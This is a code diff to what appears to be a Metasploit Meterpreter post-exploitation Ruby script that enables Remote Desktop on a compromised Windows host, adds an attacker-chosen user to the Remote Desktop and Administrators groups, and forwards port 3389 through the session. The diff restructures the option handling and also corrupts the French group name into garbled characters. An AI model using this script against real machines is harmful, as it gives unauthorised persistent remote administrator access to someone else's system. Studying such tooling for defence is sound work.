@@ -36,7 +36,6 @@ end
 
 
 def langdetect(lang)
-	puts "langdetect"
 	if lang != nil
 		print_status("Language set by user to: '#{lang}'")
 	else
@@ -63,7 +62,7 @@ def enablerd()
 		if v == 1
 			print_status "\tRDP is disabled; enabling it ..."
 			registry_setvaldata(key,value,0,"REG_DWORD")
-			file_local_write(@dest,"reg setval -k \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" -v 'fDenyTSConnections' -d \"1\"")
+			file_local_write(@dest,"reg setval -k \'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\' -v 'fDenyTSConnections' -d \"1\"")
 		else
 			print_status "\tRDP is already enabled"
 		end
@@ -110,7 +109,7 @@ def addrdpusr(session, username, password, lang)
 		rdu = "Remotedesktopbenutzer"
 		admin = "Administratoren"
 	when "fr_FR"
-		rdu = "Utilisateurs du Bureau ˆ distance"
+		rdu = "Utilisateurs du Bureau ï¿½ distance"
 		admin = "Administrateurs"
 	end
 
@@ -139,7 +138,7 @@ end
 # Parsing of Options
 usr = nil
 pass = nil
-lang = nil
+lang = "en_EN"
 lport = 1024 + rand(1024)
 enbl = nil
 frwrd = nil
@@ -162,26 +161,19 @@ frwrd = nil
 	end
 
 }
+message
 if enbl
-	message
 	enablerd()
 	enabletssrv()
-	print_status("For cleanup use command: run multi_console_command -rc #{@dest}")
-
-elsif usr != nil && pass != nil
-	message
+end
+if usr != nil && pass != nil
 	langdetect(lang)
-	enablerd()
-	enabletssrv()
 	addrdpusr(session, usr, pass, lang)
-	print_status("For cleanup use command: run multi_console_command -rc #{@dest}")
-
-else
-	usage
 end
 if frwrd == true
 	print_status("Starting the port forwarding at local port #{lport}")
 	client.run_cmd("portfwd add -L 0.0.0.0 -l #{lport} -p 3389 -r 127.0.0.1")
 end
+print_status("For cleanup use command: run multi_console_command -rc #{@dest}")
 
 
